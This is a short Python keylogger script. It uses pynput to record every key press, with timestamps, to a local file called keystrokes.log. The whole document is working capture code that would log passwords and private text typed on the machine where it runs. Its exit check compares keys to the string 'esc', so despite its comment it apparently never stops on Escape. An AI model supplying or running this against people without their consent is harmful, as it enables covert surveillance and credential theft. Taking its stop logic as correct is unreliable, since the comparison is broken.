from pynput.keyboard import Listener
import logging

# Set up logging configuration
log_file = "keystrokes.log"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')

def on_press(key):
    try:
        # Log the key that was pressed (and convert to string if possible)
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        # Handle special keys like 'space', 'enter', etc.
        logging.info(f'Special key {key} pressed')

def on_release(key):
    if key == 'esc':  # Stop the listener when 'esc' key is released
        return False

# Set up listener for key presses
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()